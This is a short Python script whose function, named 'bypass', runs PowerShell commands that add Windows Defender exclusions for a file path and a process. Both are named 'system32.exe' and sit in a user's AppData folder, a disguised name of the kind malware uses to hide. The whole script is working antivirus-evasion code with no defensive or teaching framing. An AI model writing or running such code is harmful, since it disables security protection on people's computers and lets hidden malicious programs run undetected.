import subprocess
import requests

def bypass():
    commands = [
        'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" -Name "C:\\Users\\User\\AppData\\Roaming\\Microsoft\\Windows\\system32.exe" -Value 0 -PropertyType DWORD',
        'New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Processes" -Name "system32.exe" -Value 0 -PropertyType DWORD',
    ]

    for command in commands:
        result = subprocess.run(["powershell", "-Command", command])
